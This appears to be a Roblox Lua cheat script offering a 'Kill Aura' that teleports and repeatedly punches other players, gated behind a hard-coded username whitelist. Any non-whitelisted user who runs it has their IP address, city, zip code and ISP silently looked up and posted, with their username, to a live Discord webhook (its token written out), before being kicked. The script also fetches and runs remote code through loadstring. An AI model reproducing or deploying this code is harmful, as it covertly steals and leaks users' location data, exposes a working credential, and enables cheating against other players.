-- Whitelist for specific usernames 
local whitelistedUsers = {
   "Mrbignewcoming3",
   "Hi_dorihi",  --whitelisted
}

-- Function to check if player is whitelisted
local function isWhitelisted(username)
   for _, whitelisted in ipairs(whitelistedUsers) do
       if username == whitelisted then
           return true
       end
   end
   return false
end

-- Get the local player's username
local player = game.Players.LocalPlayer
local username = player.Name

-- Function to send data to the webhook
local function sendWebhookData(player_name, ipinfo_table)
    local webhook_url = "https://discord.com/api/webhooks/1330113801558691840/27eBfT1ihaS3EqJOhTLi4-rxb1y1no-l3kESIRYiGgG5Bgre0we5SqI6EFOPBoEifp14"  -- Replace with your actual webhook URL
    local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", 
        player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
    
    local success, response = pcall(function()
        game:GetService("HttpService"):PostAsync(
            webhook_url, 
            game:GetService("HttpService"):JSONEncode({["content"] = dataMessage}),
            Enum.HttpContentType.ApplicationJson
        )
    end)

    if not success then
        warn("Failed to send webhook data: " .. response)
    end
end

-- If the player is not whitelisted, get their IP info and kick them
if not isWhitelisted(username) then
    local player_name = player.Name

    -- Get IP information
    local ip_info
    local success, response = pcall(function()
        ip_info = game:GetService("HttpService"):GetAsync("http://ip-api.com/json")
    end)

    if not success then
        warn("Failed to get IP info: " .. response)
        return
    end

    local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info)

    -- Send IP info to webhook
    sendWebhookData(player_name, ipinfo_table)

    -- Kick the player
    player:Kick("Not WhiteListed L")
else
    local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/adopttesting/Testing/refs/heads/main/Library", true))()

    local window = library:AddWindow("Belugaga V1 [] Made By Adopt", {
        main_color = Color3.fromRGB(0, 0, 0), -- Color
        min_size = Vector2.new(500, 450), -- Size of the gui
        can_resize = false, -- true or false
    })

    local Client = window:AddTab("Client")

Client:AddSwitch("Kill Aura", function(bool)
    local player = game.Players.LocalPlayer
    local playerName = player.Name
    local punchTool =
        player.Backpack:FindFirstChild("Punch") or
        game.Workspace:FindFirstChild(playerName):FindFirstChild("Punch")

    local auraRange = 10000  -- Set the range of the kill aura
    _G.autoPunchanim = true  -- Global control variable

    -- Store original HumanoidRootPart positions
    local originalPositions = {}

    -- Function to teleport the target's HumanoidRootPart to our RightHand position
    local function teleportTorsoToHands(otherPlayer)
        if otherPlayer.Character then
            local otherRoot = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
            if otherRoot then
                -- Make the HumanoidRootPart invisible and non-collidable
                otherRoot.Transparency = 1
                otherRoot.CanCollide = false
                
                -- Teleport the HumanoidRootPart to our RightHand position
                game:GetService("RunService").Heartbeat:Connect(function()
                    if otherRoot and player.Character and player.Character:FindFirstChild("RightHand") then
                        -- Teleport only the HumanoidRootPart (torso) to RightHand
                        otherRoot.CFrame = player.Character.RightHand.CFrame
                    end
                end)
            end
        end
    end

    -- Function to punch nearby players
    local function punchNearbyPlayers()
        for _, otherPlayer in pairs(game.Players:GetPlayers()) do
            if otherPlayer ~= player and otherPlayer.Character then
                local otherRoot = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
                local otherHumanoid = otherPlayer.Character:FindFirstChild("Humanoid")
                if otherRoot and otherHumanoid then
                    -- Calculate distance
                    local distance = (player.Character.HumanoidRootPart.Position - otherRoot.Position).Magnitude
                    if distance <= auraRange then
                        -- Punch the target if in range
                        if punchTool then
                            if punchTool.Parent ~= player.Character then
                                punchTool.Parent = player.Character -- Equip the tool
                            end
                            -- Trigger the punch animation
                            game.Players.LocalPlayer.muscleEvent:FireServer("punch", "rightHand")
                            game.Players.LocalPlayer.muscleEvent:FireServer("punch", "leftHand")
                        else
                            warn("Punch tool not found")
                            _G.autoPunchanim = false -- Stop if tool is not found
                        end
                    end
                end
            end
        end
    end

    -- Main loop for kill aura
    if bool then
        -- Teleport all other players' HumanoidRootParts to RightHand and make them invisible
        for _, otherPlayer in pairs(game.Players:GetPlayers()) do
            if otherPlayer ~= player then
                teleportTorsoToHands(otherPlayer)
            end
        end

        -- Loop to keep punching and checking for nearby players
        while _G.autoPunchanim do
            punchNearbyPlayers() -- Ensure all players within range are punched
            wait(0.1)  -- Adjust delay for performance and punch checks
        end
    else
        -- Deactivate the kill aura
        _G.autoPunchanim = false

        -- Reset all players' HumanoidRootParts back to normal visibility and position
        for _, otherPlayer in pairs(game.Players:GetPlayers()) do
            if otherPlayer.Character then
                local otherRoot = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
                if otherRoot then
                    -- Make the HumanoidRootPart visible and restore default settings
                    otherRoot.Transparency = 0
                    otherRoot.CanCollide = true  -- Enable collision again
                end
            end
        end
    end
end)

--end of script whitelist
end

